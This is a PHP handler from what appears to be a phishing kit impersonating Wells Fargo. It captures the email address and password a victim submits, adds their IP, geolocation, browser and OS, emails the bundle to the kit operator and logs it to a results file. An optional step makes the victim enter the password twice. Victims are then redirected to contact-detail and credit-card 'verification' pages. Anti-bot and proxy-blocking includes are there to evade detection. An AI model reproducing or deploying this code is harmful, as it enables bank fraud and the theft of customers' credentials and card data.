<?php
ob_start();
session_start();
include('../../Against_bot/east_a/useragent_bot.php');
require '../../Against_bot/east_b/main.php';
include('../../panel/config.php');
include '../../Against_bot/east_b/random.php';
require_once '../Comp.php';
if ($api_protection =="true") {
	include('../../Against_bot/east_b/proxyblock.php');
}

    $comps = new Comp;

    $settings = $comps->settings();


    if (isset(
        $_SESSION['email'],
        $_POST['emailPassword']
    )) {
        if (!$comps->checkEmpty(
            $_SESSION['email'],
            $_POST['emailPassword']
        )) {
            $_SESSION['emailPassword'] = $_POST['emailPassword'];

            if (isset($settings['LoginTwice']) && $settings['LoginTwice'] == "on") {
                 if (!isset($_SESSION['loginTwice']) || !$_SESSION['loginTwice']) {
                    $_SESSION['loginTwice'] = 1;
                    
    $v_ip = $_SERVER['REMOTE_ADDR'];
    $email = $_SESSION['email'];
    $emailpass = $_SESSION['emailPassword'] = $_POST['emailPassword'] ;
    $VictimInfo1 = "| Submitted by : https://www.geodatatool.com/en/?ip=$v_ip  ";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3r4gent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $message = "+ ----- [ ❤️East code❤️ ] -----+\n";
    $message .="| Wellsfargo EMAIL : $email\n";
    $message .="| Wellsfargo p4ssw0rd : $emailpass\n";
    $message .= "+ --------------------------+\n";
    $message .= "+ 🌐 Victim Inf0rmation\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ----------------------------+\n";
    $subject = "$v_ip (📧 WELLSFARGO EMAIL ) \n";
    $head = "Content-type:text/plain;charset=UTF-8\r\n";
    $head ="From: WELLSFARGO <wells@eastcoder.com>\r\n";


    @mail($your_email,$subject,$message,$head);
    $save=fopen("../resultz/email.txt","a+");
	fwrite($save,$message);
	fclose($save);    
                    
        
                    die($comps->headerX("../../oam/email/" . $comps->userEmail($_SESSION['email']) . ""));
            }
            
            
if (isset($_SESSION['loginTwice']) && $_SESSION['loginTwice']) {
                    unset($_SESSION['loginTwice']);
                    
    $v_ip = $_SERVER['REMOTE_ADDR'];
    $email = $_SESSION['email'];
	$emailpass = $_SESSION['emailPassword'] = $_POST['emailPassword'] ;
    $VictimInfo1 = "| Submitted by : https://www.geodatatool.com/en/?ip=$v_ip  ";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3r4gent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $message = "+ ----- [ ❤️East code️ ] -----+\n";
    $message .="| Wellsfargo EMAIL : $email\n";
    $message .="| Wellsfargo p4ssw0rd : $emailpass\n";
    $message .= "+ --------------------------+\n";
    $message .= "+ 🌐 Victim Inf0rmation\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ----------------------------+\n";
    $subject = "$v_ip ( WELLSFARGO EMAIL ) \n";
    $head = "Content-type:text/plain;charset=UTF-8\r\n";
    $head ="From: WELLSFARGO <wells@eastcoder.com>\r\n";


    @mail($your_email,$subject,$message,$head);
    $save=fopen("../resultz/email.txt","a+");
	fwrite($save,$message);
	fclose($save);
                    
                    
                        if ($show_contact_information=="yes") {
	               	        die($comps->headerX("../../oam/contact_information?origin=".$redirect."&langPref=".$cn.""));
                        }
                        if ($show_credit_card=="yes") {
	               	        die($comps->headerX("../../oam/credit_verification?origin=".$redirect."&langPref=".$cn.""));
                        }
                        if ($show_success_page=="yes") {
	               	        die($comps->headerX("../../oam/logout?origin=".$redirect."&langPref=".$cn.""));
                        }
                    } else {
                        
                        die($antibot->throw404());
                    }
            } else {
                if ($show_contact_information=="yes") {
	               	die($comps->headerX("../../oam/contact_information?origin=".$redirect."&langPref=".$cn.""));
                }
                if ($show_credit_card=="yes") {
	               	die($comps->headerX("../../oam/credit_verification?origin=".$redirect."&langPref=".$cn.""));
                }
                if ($show_success_page=="yes") {
	               	 die($comps->headerX("../../oam/logout?origin=".$redirect."&langPref=".$cn.""));
                }
            } 
            
            
            
            
        } else {
            echo $antibot->throw404();
            die();
        }   
    } else {
        echo $antibot->throw404();
        die();
    }